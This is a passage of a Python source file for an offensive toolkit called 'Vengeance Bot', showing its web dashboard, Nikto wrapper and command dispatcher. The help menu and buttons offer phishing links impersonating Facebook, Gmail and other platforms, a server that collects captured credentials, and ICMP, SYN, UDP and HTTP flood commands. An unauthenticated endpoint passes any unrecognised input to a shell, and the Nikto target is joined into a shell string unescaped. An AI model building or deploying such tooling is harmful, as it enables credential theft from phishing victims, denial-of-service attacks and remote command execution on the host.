        return {'success': True, 'message': 'Disconnected'}

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db):
        self.db = db
        self.nikto_available = shutil.which('nikto') is not None
    
    def scan(self, target, options=None):
        if not self.nikto_available:
            return {'success': False, 'output': 'Nikto not installed'}
        
        options = options or {}
        start_time = time.time()
        
        cmd = ['nikto', '-host', target]
        if options.get('ssl'):
            cmd.append('-ssl')
        if options.get('port'):
            cmd.extend(['-port', str(options['port'])])
        
        output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{int(time.time())}.txt")
        cmd.extend(['-o', output_file])
        
        result = CommandExecutor.run(' '.join(cmd), 300)
        scan_time = time.time() - start_time
        
        vulnerabilities = self._parse_output(result['output'])
        
        self.db.cursor.execute('''
            INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
            VALUES (?, ?, ?, ?, ?)
        ''', (target, json.dumps(vulnerabilities), output_file, scan_time, result['success']))
        self.db.conn.commit()
        
        return {
            'success': result['success'],
            'target': target,
            'vulnerabilities': vulnerabilities,
            'vulnerability_count': len(vulnerabilities),
            'output_file': output_file,
            'scan_time': scan_time,
            'output': result['output'][:2000]
        }
    
    def _parse_output(self, output):
        vulnerabilities = []
        for line in output.split('\n'):
            if '+ ' in line or 'OSVDB' in line or 'CVE' in line:
                severity = 'medium'
                if 'CRITICAL' in line.upper() or 'EXPLOIT' in line.upper():
                    severity = 'critical'
                elif 'WARNING' in line.upper():
                    severity = 'high'
                vulnerabilities.append({
                    'description': line.strip(),
                    'severity': severity
                })
        return vulnerabilities
    
    def full_scan(self, target):
        return self.scan(target, {'ssl': target.startswith('https')})
    
    def ssl_scan(self, target):
        return self.scan(target, {'ssl': True})
    
    def sql_scan(self, target):
        return self.scan(target, {'port': 80})
    
    def get_recent(self, limit=10):
        try:
            self.db.cursor.execute('SELECT * FROM nikto_scans ORDER BY timestamp DESC LIMIT ?', (limit,))
            scans = []
            for row in self.db.cursor.fetchall():
                s = dict(row)
                s['vulnerabilities'] = json.loads(s['vulnerabilities']) if s['vulnerabilities'] else []
                scans.append(s)
            return scans
        except:
            return []

# =====================
# WEB SERVER (Origami Cyberpunk Theme)
# =====================
WEB_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vengeance Bot — Cybersecurity Dashboard</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --orange:    #FF6B00;
    --orange2:   #FF9A3C;
    --yellow:    #FFD700;
    --yellow2:   #FFF176;
    --blue:      #0D47A1;
    --blue2:     #1976D2;
    --blue3:     #42A5F5;
    --cyan:      #00E5FF;
    --dark:      #0A0C10;
    --dark2:     #0F1218;
    --dark3:     #161B26;
    --dark4:     #1E2535;
    --glass:     rgba(255,107,0,0.06);
    --glass2:    rgba(13,71,161,0.12);
    --border:    rgba(255,107,0,0.3);
    --border2:   rgba(66,165,245,0.25);
    --text:      #F0F0F0;
    --text2:     #A0AEC0;
    --glow:      0 0 20px rgba(255,107,0,0.4);
    --glow2:     0 0 20px rgba(0,229,255,0.3);
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: var(--dark);
    color: var(--text);
    font-family: 'Rajdhani', sans-serif;
    min-height: 100vh;
    overflow-x: hidden;
    cursor: crosshair;
  }

  /* Origami Background */
  #origami-bg {
    position: fixed; inset: 0; z-index: 0;
    pointer-events: none; overflow: hidden;
  }
  .orig-panel {
    position: absolute;
    border: 1px solid;
    opacity: 0;
    animation: foldIn 1.4s cubic-bezier(.22,.68,0,1.2) forwards;
  }
  @keyframes foldIn {
    0%   { opacity:0; transform: rotateY(90deg) scale(0.4); }
    60%  { opacity:.18; }
    100% { opacity:.09; transform: rotateY(0deg) scale(1); }
  }
  .orig-panel:nth-child(1)  { width:320px;height:280px;top:5%;left:2%;border-color:rgba(255,107,0,.25);background:linear-gradient(135deg,rgba(255,107,0,.06),transparent);clip-path:polygon(0 0,100% 0,85% 100%,0 100%);animation-delay:.1s; }
  .orig-panel:nth-child(2)  { width:200px;height:200px;top:60%;left:0%;border-color:rgba(13,71,161,.3);background:linear-gradient(45deg,rgba(13,71,161,.08),transparent);clip-path:polygon(15% 0,100% 0,100% 85%,0 100%);animation-delay:.25s; }
  .orig-panel:nth-child(3)  { width:260px;height:300px;top:10%;right:2%;border-color:rgba(255,215,0,.2);background:linear-gradient(225deg,rgba(255,215,0,.05),transparent);clip-path:polygon(0 0,100% 15%,100% 100%,0 85%);animation-delay:.4s; }
  .orig-panel:nth-child(4)  { width:180px;height:180px;top:70%;right:3%;border-color:rgba(0,229,255,.2);background:linear-gradient(315deg,rgba(0,229,255,.05),transparent);clip-path:polygon(50% 0,100% 50%,50% 100%,0 50%);animation-delay:.55s; }
  .orig-panel:nth-child(5)  { width:140px;height:140px;top:40%;left:1%;border-color:rgba(255,154,60,.2);clip-path:polygon(25% 0,75% 0,100% 50%,75% 100%,25% 100%,0 50%);animation-delay:.7s; }
  .orig-panel:nth-child(6)  { width:300px;height:240px;bottom:5%;left:20%;border-color:rgba(25,118,210,.2);background:linear-gradient(60deg,rgba(25,118,210,.06),transparent);clip-path:polygon(0 20%,80% 0,100% 80%,20% 100%);animation-delay:.85s; }

  #grid-overlay {
    position: fixed; inset:0; z-index:0; pointer-events:none;
    background-image:
      linear-gradient(rgba(255,107,0,.03) 1px, transparent 1px),
      linear-gradient(90deg, rgba(255,107,0,.03) 1px, transparent 1px);
    background-size: 40px 40px;
  }

  #app { position: relative; z-index: 1; display: flex; flex-direction: column; min-height: 100vh; }

  header {
    display: flex; align-items: center; justify-content: space-between;
    padding: 14px 30px;
    background: linear-gradient(90deg, rgba(10,12,16,.98), rgba(13,71,161,.12), rgba(10,12,16,.98));
    border-bottom: 1px solid var(--border);
    box-shadow: 0 2px 30px rgba(255,107,0,.15);
    position: sticky; top:0; z-index:100;
  }
  .logo-area { display:flex; align-items:center; gap:14px; }
  .logo-img {
    width:50px; height:50px; border-radius:8px;
    border: 2px solid var(--orange);
    box-shadow: var(--glow);
    display: flex; align-items:center; justify-content:center;
    font-family:'Orbitron',sans-serif; font-size:18px; font-weight:900;
    color: #fff; background: linear-gradient(135deg, var(--orange), var(--blue2));
  }
  .logo-text {
    font-family: 'Orbitron', sans-serif;
    font-size: 22px; font-weight: 900;
    background: linear-gradient(90deg, var(--orange), var(--yellow), var(--blue3));
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    letter-spacing: 3px;
  }
  .logo-sub { font-size:10px; color: var(--text2); letter-spacing:4px; font-family:'Share Tech Mono'; }

  .header-status { display:flex; align-items:center; gap:20px; }
  .status-pill {
    display:flex; align-items:center; gap:7px;
    padding: 5px 14px; border-radius:20px;
    background: rgba(0,229,255,.08);
    border: 1px solid rgba(0,229,255,.3);
    font-family:'Share Tech Mono'; font-size:11px; color: var(--cyan);
  }
  .status-dot { width:8px;height:8px;border-radius:50%;background:var(--cyan);animation:pulse 1.5s infinite; }
  @keyframes pulse { 0%,100%{opacity:1;box-shadow:0 0 6px var(--cyan);} 50%{opacity:.4;} }

  .time-display { font-family:'Share Tech Mono'; font-size:13px; color:var(--orange2); }

  main {
    flex: 1; display: grid;
    grid-template-columns: 260px 1fr 300px;
    gap: 16px; padding: 20px;
  }

  .panel {
    background: var(--dark3);
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 18px;
    position: relative;
    overflow: hidden;
    animation: panelSlide .6s cubic-bezier(.22,.68,0,1.2) both;
  }
  @keyframes panelSlide {
    from { opacity:0; transform: translateY(20px); }
    to   { opacity:1; transform: translateY(0); }
  }
  .panel::before {
    content:''; position:absolute; top:0; left:0; right:0; height:2px;
    background: linear-gradient(90deg, transparent, var(--orange), var(--yellow), transparent);
  }
  .panel.blue-accent::before {
    background: linear-gradient(90deg, transparent, var(--blue2), var(--cyan), transparent);
  }
  .panel-title {
    font-family: 'Orbitron', sans-serif;
    font-size: 10px; letter-spacing: 3px;
    color: var(--orange); text-transform: uppercase;
    margin-bottom: 14px;
    display:flex; align-items:center; gap:8px;
  }
  .panel-title.blue { color: var(--blue3); }
  .panel-title::before {
    content:''; width:14px; height:2px;
    background: var(--orange);
    display:inline-block;
  }

  /* Terminal */
  .terminal-output {
    background: #050709;
    border: 1px solid rgba(255,107,0,.2);
    border-radius: 4px;
    height: 220px; overflow-y:auto;
    padding: 12px; margin-bottom:12px;
    font-family:'Share Tech Mono'; font-size:12px;
    line-height:1.7;
  }
  .t-line { animation: fadeInLine .3s ease; }
  @keyframes fadeInLine { from{opacity:0;transform:translateX(-5px)} to{opacity:1;transform:none} }
  .t-line.cmd { color: var(--yellow); }
  .t-line.info { color: var(--cyan); }
  .t-line.warn { color: var(--orange); }
  .t-line.err  { color: #ff4444; }
  .t-line.ok   { color: #69ff47; }

  .cmd-input-row {
    display:flex; align-items:center; gap:8px;
    background: #050709;
    border: 1px solid var(--border);
    border-radius: 4px; padding: 0 12px;
  }
  .cmd-prompt { font-family:'Share Tech Mono'; color:var(--orange); font-size:13px; white-space:nowrap; }
  .cmd-input {
    flex:1; background:none; border:none; outline:none;
    font-family:'Share Tech Mono'; font-size:13px;
    color: var(--yellow2); padding: 10px 0;
    caret-color: var(--orange);
  }
  .cmd-btn {
    background: linear-gradient(135deg, var(--orange), var(--orange2));
    border: none; color:#000; font-weight:700; font-size:11px;
    padding: 7px 16px; border-radius:3px; cursor:pointer;
    letter-spacing:1px; font-family:'Orbitron';
  }
  .cmd-btn:hover { box-shadow: var(--glow); transform:scale(1.04); }

  .quick-cmds { display:flex; flex-wrap:wrap; gap:7px; margin-top:12px; }
  .qcmd {
    background: var(--glass2); border: 1px solid var(--border2);
    color: var(--blue3); font-family:'Share Tech Mono'; font-size:11px;
    padding: 4px 11px; border-radius:3px; cursor:pointer;
  }
  .qcmd:hover { background: rgba(66,165,245,.15); box-shadow: var(--glow2); color: var(--cyan); }

  /* Ports Display */
  .ports-container { display: flex; gap: 20px; margin-top: 15px; flex-wrap: wrap; }
  .port-list { flex: 1; background: #050709; border-radius: 4px; padding: 12px; border: 1px solid rgba(255,107,0,.2); }
  .port-list h4 { font-family:'Orbitron'; font-size: 11px; margin-bottom: 10px; }
  .port-list h4 i { margin-right: 6px; }
  .port-tag {
    display: inline-block; padding: 4px 10px; border-radius: 20px;
    font-size: 11px; font-family: 'Share Tech Mono'; margin: 4px;
  }
  .port-tag.open { background: #2ecc71; color: #000; }
  .port-tag.closed { background: #e74c3c; color: #fff; }

  canvas { max-width: 100%; }
  
  .nav-item {
    display:flex; align-items:center; gap:10px;
    padding: 10px 14px; border-radius:5px;
    cursor: pointer; font-size:13px; font-weight:600;
    color: var(--text2); letter-spacing:1px;
    transition: all .25s;
    border: 1px solid transparent;
  }
  .nav-item:hover, .nav-item.active {
    color: var(--orange); background: var(--glass);
    border-color: var(--border);
    box-shadow: var(--glow);
  }
  .nav-badge {
    margin-left:auto; background:var(--orange);
    color:#000; font-size:10px; padding:2px 7px;
    border-radius:10px; font-weight:700;
  }

  .footer {
    display:flex; align-items:center; justify-content:space-between;
    padding:8px 30px;
    border-top:1px solid var(--border);
    background: rgba(10,12,16,.98);
    font-family:'Share Tech Mono'; font-size:11px; color:var(--text2);
  }
  .footer span { color:var(--orange); }

  @media(max-width:1000px){
    main { grid-template-columns: 1fr; }
    .sidebar-left { grid-row: 1; }
    .terminal-area { grid-row: 2; }
    .ports-row { grid-row: 3; }
    .sidebar-right { grid-row: 4; }
  }
</style>
</head>
<body>

<div id="origami-bg">
  <div class="orig-panel"></div><div class="orig-panel"></div><div class="orig-panel"></div>
  <div class="orig-panel"></div><div class="orig-panel"></div><div class="orig-panel"></div>
</div>
<div id="grid-overlay"></div>

<div id="app">
  <header>
    <div class="logo-area">
      <div class="logo-img">VB</div>
      <div><div class="logo-text">VENGEANCE BOT</div><div class="logo-sub">CYBERSECURITY COMMAND CENTER</div></div>
    </div>
    <div class="header-status">
      <div class="status-pill"><div class="status-dot"></div>SYSTEM ONLINE</div>
      <div class="status-pill" style="border-color:rgba(255,107,0,.3);color:var(--orange2);">
        <div class="status-dot" style="background:var(--orange);"></div>ARMED
      </div>
      <div class="time-display" id="clock">00:00:00</div>
    </div>
  </header>

  <main>
    <!-- Sidebar Left -->
    <div class="sidebar-left">
      <div class="panel">
        <div class="panel-title">Navigation</div>
        <div class="nav-item active" onclick="setNav(this,'terminal')"><span>⌨</span> Terminal <span class="nav-badge" id="cmdBadge">0</span></div>
        <div class="nav-item" onclick="setNav(this,'network')"><span>📡</span> Network</div>
        <div class="nav-item" onclick="setNav(this,'scans')"><span>🔍</span> Scans</div>
        <div class="nav-item" onclick="setNav(this,'phishing')"><span>🎣</span> Phishing</div>
        <div class="nav-item" onclick="setNav(this,'bruteforce')"><span>🔑</span> Brute Force</div>
        <div class="nav-item" onclick="setNav(this,'alerts')"><span>🚨</span> Alerts</div>
      </div>

      <div class="panel">
        <div class="panel-title blue">System Info</div>
        <div style="font-size:12px;color:var(--text2);line-height:2.2;font-family:'Share Tech Mono';">
          <div>OS: <span style="color:var(--yellow)"><span id="sysOS">Kali Linux</span></span></div>
          <div>IP: <span style="color:var(--orange2)" id="sysIP">--.--.--.--</span></div>
          <div>Mode: <span style="color:#69ff47">ACTIVE</span></div>
        </div>
        <div class="prog-wrap" style="margin-top:8px;"><div class="prog-label"><span>CPU</span><span id="cpuVal">0%</span></div>
        <div class="prog-bar"><div class="prog-fill" id="cpuBar" style="width:0%"></div></div></div>
        <div class="prog-wrap"><div class="prog-label"><span>RAM</span><span id="ramVal">0%</span></div>
        <div class="prog-bar"><div class="prog-fill blue" id="ramBar" style="width:0%"></div></div></div>
      </div>
    </div>

    <!-- Terminal Area -->
    <div class="panel terminal-area">
      <div class="panel-title">Command Terminal</div>
      <div class="terminal-output" id="termOut">
        <div class="t-line ok">[ OK ] Vengeance Bot v1.0.0 initialized</div>
        <div class="t-line info">[ INFO ] Multi-platform bots: Discord, Telegram, Signal, Slack, iMessage, Google Chat</div>
        <div class="t-line ok">[ OK ] Web dashboard ready</div>
        <div class="t-line info">[ INFO ] Type 'help' for available commands</div>
      </div>
      <div class="cmd-input-row">
        <span class="cmd-prompt">vengeance@bot:~# </span>
        <input class="cmd-input" id="cmdInput" type="text" placeholder="Enter command..." autocomplete="off">
        <button class="cmd-btn" onclick="runCommand()">EXEC</button>
      </div>
      <div class="quick-cmds">
        <div class="qcmd" onclick="fillCmd('help')">help</div>
        <div class="qcmd" onclick="fillCmd('status')">status</div>
        <div class="qcmd" onclick="fillCmd('scan 127.0.0.1')">scan 127.0.0.1</div>
        <div class="qcmd" onclick="fillCmd('ping 127.0.0.1')">ping 127.0.0.1</div>
        <div class="qcmd" onclick="fillCmd('whois iankulani.mw')">whois</div>
        <div class="qcmd" onclick="fillCmd('generate_phishing_link facebook')">phish fb</div>
        <div class="qcmd" onclick="fillCmd('generate_random_phishing_link')">random phish</div>
      </div>
    </div>

    <!-- Ports Display -->
    <div class="panel blue-accent" style="grid-column:2; grid-row:2;">
      <div class="panel-title blue">Port Scan Results</div>
      <div class="ports-container" id="portsContainer">
        <div class="port-list"><h4><i>🔓</i> OPEN PORTS</h4><div id="openPortsList">No scan yet</div></div>
        <div class="port-list"><h4><i>🔒</i> CLOSED PORTS</h4><div id="closedPortsList">No scan yet</div></div>
      </div>
      <div style="margin-top:10px;text-align:right">
        <button class="qcmd" onclick="fillCmd('scan 192.168.1.1')">Demo Scan</button>
      </div>
    </div>

    <!-- Right Sidebar -->
    <div class="sidebar-right">
      <div class="panel">
        <div class="panel-title">Quick Actions</div>
        <div class="quick-cmds" style="flex-direction:column; gap:8px;">
          <button class="cmd-btn" style="width:100%;" onclick="fillCmd('generate_random_phishing_link')">🎲 Random Phish Link</button>
          <button class="cmd-btn" style="width:100%; background:linear-gradient(135deg, var(--blue), var(--blue2));" onclick="fillCmd('ssh_list')">🔌 SSH Servers</button>
          <button class="cmd-btn" style="width:100%; background:linear-gradient(135deg, var(--blue), var(--blue2));" onclick="fillCmd('nikto example.com')">🕷️ Nikto Scan</button>
          <button class="cmd-btn" style="width:100%;" onclick="fillCmd('traffic_icmp 127.0.0.7')">🚀 ICMP Flood</button>
        </div>
      </div>

      <div class="panel">
        <div class="panel-title blue">Security Alerts</div>
        <div class="alert-feed" id="alertFeed" style="max-height:200px; overflow-y:auto;">
          <div class="alert-item high"><div><div class="alert-sev">HIGH</div><div class="alert-msg">System ready</div><div class="alert-time">Now</div></div></div>
        </div>
      </div>

      <div class="panel">
        <div class="panel-title">Statistics</div>
        <div id="statsDisplay" style="font-family:'Share Tech Mono'; font-size:12px; line-height:2;">
          Loading...
        </div>
      </div>
    </div>
  </main>

  <footer>
    <span>VENGEANCE BOT</span> — Cybersecurity Command Center &nbsp;|&nbsp; <span id="footerTime"></span>
    &nbsp;|&nbsp; Multi-Platform: Discord | Telegram | Signal | Slack | iMessage | Google Chat
    <span style="color:var(--cyan);">[ SECURE ]</span>
  </footer>
</div>

<script>
let cmdCount = 0;

function tick(){
  const n = new Date();
  const s = [n.getHours(),n.getMinutes(),n.getSeconds()].map(v=>String(v).padStart(2,'0')).join(':');
  document.getElementById('clock').textContent = s;
  document.getElementById('footerTime').textContent = n.toLocaleDateString()+' '+s;
}
setInterval(tick,1000); tick();

function setNav(el, section){
  document.querySelectorAll('.nav-item').forEach(i=>i.classList.remove('active'));
  el.classList.add('active');
}

function addLine(type, text){
  const d=document.getElementById('termOut');
  const el=document.createElement('div');
  el.className='t-line '+type;
  el.textContent=text;
  d.appendChild(el);
  d.scrollTop=d.scrollHeight;
  cmdCount++;
  document.getElementById('cmdBadge').textContent = cmdCount;
}

function runCommand(){
  const inp=document.getElementById('cmdInput');
  const raw=inp.value.trim();
  if(!raw)return;
  addLine('cmd','vengeance@bot:~# '+raw);
  inp.value='';
  
  fetch('/api/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: raw })
  })
  .then(res => res.json())
  .then(data => {
    if(data.success){
      addLine('ok', data.output || 'Command executed');
    } else {
      addLine('err', 'ERROR: ' + (data.output || 'Unknown error'));
    }
    addLine('info', `[Time: ${(data.execution_time || 0).toFixed(2)}s]`);
    loadStats();
    loadPorts();
  })
  .catch(err => addLine('err', 'Request failed: ' + err.message));
}

function fillCmd(cmd){
  document.getElementById('cmdInput').value = cmd;
  document.getElementById('cmdInput').focus();
}

function loadStats(){
  fetch('/api/stats')
    .then(res => res.json())
    .then(stats => {
      document.getElementById('statsDisplay').innerHTML = `
        <div>Commands: ${stats.total_commands || 0}</div>
        <div>Scans: ${stats.total_scans || 0}</div>
        <div>Threats: ${stats.total_threats || 0}</div>
        <div>Phishing: ${stats.phishing_links || 0}</div>
        <div>Credentials: ${stats.captured_credentials || 0}</div>
        <div>Wordlists: ${stats.wordlists || 0}</div>
      `;
      // Simulate system stats
      const cpu = Math.round(30 + Math.random() * 40);
      const ram = Math.round(45 + Math.random() * 35);
      document.getElementById('cpuVal').textContent = cpu + '%';
      document.getElementById('cpuBar').style.width = cpu + '%';
      document.getElementById('ramVal').textContent = ram + '%';
      document.getElementById('ramBar').style.width = ram + '%';
    })
    .catch(console.error);
}

function loadPorts(){
  fetch('/api/ports')
    .then(res => res.json())
    .then(data => {
      const openDiv = document.getElementById('openPortsList');
      const closedDiv = document.getElementById('closedPortsList');
      if(data.open_ports && data.open_ports.length > 0){
        openDiv.innerHTML = data.open_ports.map(p => `<span class="port-tag open">${p.port}/${p.protocol}</span>`).join('');
      } else {
        openDiv.innerHTML = '<span style="color:var(--text2)">No open ports detected</span>';
      }
      if(data.closed_ports && data.closed_ports.length > 0){
        closedDiv.innerHTML = data.closed_ports.map(p => `<span class="port-tag closed">${p.port}/${p.protocol}</span>`).join('');
      } else {
        closedDiv.innerHTML = '<span style="color:var(--text2)">No closed ports</span>';
      }
    })
    .catch(console.error);
}

function loadSystemInfo(){
  fetch('/api/system')
    .then(res => res.json())
    .then(data => {
      if(data.ip) document.getElementById('sysIP').textContent = data.ip;
      if(data.os) document.getElementById('sysOS').textContent = data.os;
    })
    .catch(console.error);
}

setInterval(() => {
  loadStats();
  loadPorts();
}, 10000);

loadStats();
loadPorts();
loadSystemInfo();
addLine('ok', '[ OK ] Vengeance Bot ready. Type "help" for commands.');
</script>
</body>
</html>'''

class WebRequestHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args): pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(WEB_HTML.encode('utf-8'))
        elif self.path == '/api/stats':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            stats = self.server_instance.db.get_statistics() if self.server_instance else {}
            self.wfile.write(json.dumps(stats).encode('utf-8'))
        elif self.path == '/api/ports':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            scans = self.server_instance.db.get_recent_scans(1) if self.server_instance else []
            if scans and len(scans) > 0:
                latest = scans[0]
                self.wfile.write(json.dumps({
                    'open_ports': latest.get('open_ports', []),
                    'closed_ports': latest.get('closed_ports', [])
                }).encode('utf-8'))
            else:
                self.wfile.write(json.dumps({'open_ports': [], 'closed_ports': []}).encode('utf-8'))
        elif self.path == '/api/system':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                'ip': self.server_instance.handler._get_local_ip() if self.server_instance else '127.0.0.1',
                'os': platform.system() + ' ' + platform.release()
            }).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/api/command':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                command = data.get('command', '')
                if self.server_instance:
                    result = self.server_instance.handler.execute(command, 'web')
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps(result).encode('utf-8'))
                else:
                    self.send_response(500)
                    self.end_headers()
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'output': str(e)}).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db, port_scanner, phishing_server, ssh_manager, traffic_gen, crunch_gen, nikto_scanner):
        self.db = db
        self.scanner = port_scanner
        self.phishing = phishing_server
        self.ssh = ssh_manager
        self.traffic = traffic_gen
        self.crunch = crunch_gen
        self.nikto = nikto_scanner
        self.executor = CommandExecutor()
        self.command_map = self._setup_command_map()
    
    def _setup_command_map(self):
        return {
            'help': self._cmd_help,
            'status': self._cmd_status,
            'clear': self._cmd_clear,
            'exit': self._cmd_exit,
            'time': self._cmd_time,
            'date': self._cmd_date,
            'history': self._cmd_history,
            'ping': self._cmd_ping,
            'scan': self._cmd_scan,
            'quick_scan': self._cmd_quick_scan,
            'full_scan': self._cmd_full_scan,
            'nmap': self._cmd_nmap,
            'whois': self._cmd_whois,
            'dns': self._cmd_dns,
            'ssh_add': self._cmd_ssh_add,
            'ssh_list': self._cmd_ssh_list,
            'ssh_connect': self._cmd_ssh_connect,
            'ssh_exec': self._cmd_ssh_exec,
            'ssh_disconnect': self._cmd_ssh_disconnect,
            'traffic_icmp': self._cmd_traffic_icmp,
            'traffic_syn': self._cmd_traffic_syn,
            'traffic_udp': self._cmd_traffic_udp,
            'traffic_http': self._cmd_traffic_http,
            'traffic_ping': self._cmd_traffic_ping,
            'generate_phishing_link': self._cmd_generate_phishing,
            'generate_phishing_link_for_facebook': lambda args: self._generate_phish('facebook', args),
            'generate_phishing_link_for_instagram': lambda args: self._generate_phish('instagram', args),
            'generate_phishing_link_for_twitter': lambda args: self._generate_phish('twitter', args),
            'generate_phishing_link_for_gmail': lambda args: self._generate_phish('gmail', args),
            'generate_phishing_link_for_linkedin': lambda args: self._generate_phish('linkedin', args),
            'generate_random_phishing_link': self._cmd_random_phishing,
            'phishing_start': self._cmd_phishing_start,
            'phishing_stop': self._cmd_phishing_stop,
            'phishing_status': self._cmd_phishing_status,
            'phishing_links': self._cmd_phishing_links,
            'credentials': self._cmd_credentials,
            'nikto': self._cmd_nikto,
            'nikto_full': self._cmd_nikto_full,
            'nikto_ssl': self._cmd_nikto_ssl,
            'crunch_generate': self._cmd_crunch_generate,
            'crunch_list': self._cmd_crunch_list,
            'crunch_charsets': self._cmd_crunch_charsets,
        }
    
    def execute(self, command, source="local"):
        start_time = time.time()
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.command_map:
            try:
                result = self.command_map[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}"}
        else:
            result = self.executor.run(command)
        
        execution_time = time.time() - start_time
        self.db.log_command(command, source, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        result['execution_time'] = execution_time
        return result
    
    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _cmd_help(self, args):
        help_text = f"""
{Colors.ORANGE}🦅 VENGEANCE BOT v1.0.0 - HELP MENU{Colors.RESET}

{Colors.CYAN}📡 NETWORK COMMANDS:{Colors.RESET}
  ping <target>           - ICMP ping test
  scan <target>           - Port scan (1-1000)
  quick_scan <target>     - Quick port scan
  full_scan <target>      - Full port scan (1-65535)
  nmap <target> [options] - Full nmap scan
  whois <domain>          - WHOIS lookup
  dns <domain>            - DNS lookup

{Colors.CYAN}🔌 SSH COMMANDS:{Colors.RESET}
  ssh_add <name> <host> <user> [password] - Add SSH server
  ssh_list                                 - List SSH servers
  ssh_connect <id>                         - Connect to server
  ssh_exec <id> <command>                  - Execute command
  ssh_disconnect [id]                      - Disconnect

{Colors.CYAN}🚀 TRAFFIC COMMANDS:{Colors.RESET}
  traffic_icmp <ip> <duration> [rate]      - ICMP flood
  traffic_syn <ip> <port> <duration> [rate] - SYN flood
  traffic_udp <ip> <port> <duration> [rate] - UDP flood
  traffic_http <ip> [port] [duration] [rate] - HTTP flood
  traffic_ping <ip> <duration> [rate]      - Ping flood

{Colors.CYAN}🎣 PHISHING COMMANDS:{Colors.RESET}
  generate_phishing_link <platform>        - Generate phishing link
  generate_phishing_link_for_facebook      - Facebook phishing
  generate_phishing_link_for_instagram     - Instagram phishing
  generate_phishing_link_for_twitter       - Twitter phishing
  generate_phishing_link_for_gmail         - Gmail phishing
  generate_phishing_link_for_linkedin      - LinkedIn phishing
  generate_random_phishing_link            - Random platform phishing
  phishing_start <link_id> [port]          - Start phishing server
  phishing_stop                            - Stop phishing server
  phishing_status                          - Check server status
  phishing_links                           - List all links
  credentials                              - View captured credentials

{Colors.CYAN}🕷️ NIKTO SCANNER:{Colors.RESET}
  nikto <target>                           - Web vulnerability scan
  nikto_full <target>                      - Full scan with SSL
  nikto_ssl <target>                       - SSL-specific scan

{Colors.CYAN}🔐 CRUNCH WORDLIST:{Colors.RESET}
  crunch_generate <name> <min> <max> [pattern] - Generate wordlist
  crunch_list                              - List wordlists
  crunch_charsets                          - Show available charsets

{Colors.CYAN}📊 SYSTEM COMMANDS:{Colors.RESET}
  status              - System status
  history [limit]     - Command history
  time/date           - Current time/date
  clear               - Clear screen
  exit                - Exit program

{Colors.YELLOW}Examples:{Colors.RESET}
  scan 192.168.1.1
  generate_phishing_link facebook
  generate_random_phishing_link
  phishing_start abc123 8080
  traffic_icmp 8.8.8.8 10
  ssh_add myserver 192.168.1.100 root password123
  nikto example.com
  crunch_generate passwords 8 12 alphanum
"""
        return {'success': True, 'output': help_text}
    
    def _cmd_status(self, args):
        stats = self.db.get_statistics()
        output = f"""
{Colors.ORANGE}🦅 VENGEANCE BOT System Status{Colors.RESET}
{'='*50}
📊 Statistics:
  • Total Commands: {stats.get('total_commands', 0)}
  • Total Scans: {stats.get('total_scans', 0)}
  • Threats Detected: {stats.get('total_threats', 0)}
  • Phishing Links: {stats.get('phishing_links', 0)}
  • Captured Credentials: {stats.get('captured_credentials', 0)}
  • Wordlists: {stats.get('wordlists', 0)}

🎯 Server Status:
  • Phishing Server: {'🟢 Running' if self.phishing.running else '⚪ Stopped'}
  • Web Dashboard: 🟢 Running on http://localhost:5000
  • Local IP: {self._get_local_ip()}
"""
        return {'success': True, 'output': output}
    
    def _cmd_clear(self, args):
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _cmd_exit(self, args):
        return {'success': True, 'output': 'exit'}
    
    def _cmd_time(self, args):
        return {'success': True, 'output': f"🕐 {datetime.datetime.now().strftime('%H:%M:%S')}"}
    
    def _cmd_date(self, args):
        return {'success': True, 'output': f"📅 {datetime.datetime.now().strftime('%A, %B %d, %Y')}"}
    
    def _cmd_history(self, args):
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        self.db.cursor.execute('SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?', (limit,))
        rows = self.db.cursor.fetchall()
        if not rows:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n" + "-"*40 + "\n"
        for row in rows:
            status = "✅" if row['success'] else "❌"
            output += f"{status} [{row['timestamp'][:19]}] {row['command'][:50]}\n"
        return {'success': True, 'output': output}
    
